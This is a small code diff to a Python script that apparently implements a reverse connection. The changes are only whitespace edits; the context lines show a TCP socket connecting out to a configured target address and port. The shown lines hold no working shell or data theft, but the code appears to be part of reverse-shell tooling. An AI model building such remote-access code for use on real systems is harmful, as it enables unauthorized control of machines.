@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-
 from subprocess import run
 import os 
 
@@ -28,7 +27,7 @@ if __name__ == "__main__":
     os.system('clear')
 
     # Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
-    socket_sock = socket.socket(socket.AF_INET, # use ipv4(AF_INET) and tcp(SOCK_STREAM) for the connection
+    socket_sock             = socket.socket(socket.AF_INET, # use ipv4(AF_INET) and tcp(SOCK_STREAM) for the connection
                             socket.SOCK_STREAM)
     socket_sock.connect((reverse_connection.target_address, # start a connection to the target
                             reverse_connection.target_port))
